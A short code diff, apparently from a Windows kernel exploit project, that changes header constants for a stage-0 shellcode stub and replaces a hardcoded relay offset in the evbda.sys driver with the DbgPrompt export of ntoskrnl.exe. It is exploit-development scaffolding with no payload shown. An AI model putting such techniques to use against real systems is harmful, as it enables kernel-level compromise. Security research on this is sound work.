@@ -28,9 +28,9 @@
 #define stage_0_xoreaxeaxret_size 0x3
 #define stage_0_placeholder_size 0x8
 
-// PIT relay offset within evbda.sys (BaseOfCode + this offset), used when distance > 4GB
+// ntoskrnl DbgPrompt (used as PIT relay when distance > 4GB)
 #define NTKRNL_NAME "ntoskrnl.exe"
-#define EVBDA_PIT_RELAY_OFFSET 0x11B000
+#define DBG_EXPORT_FUNC "DbgPrompt"
 
 #define WIDEN2(x) L##x
 #define WIDEN(x) WIDEN2(x)
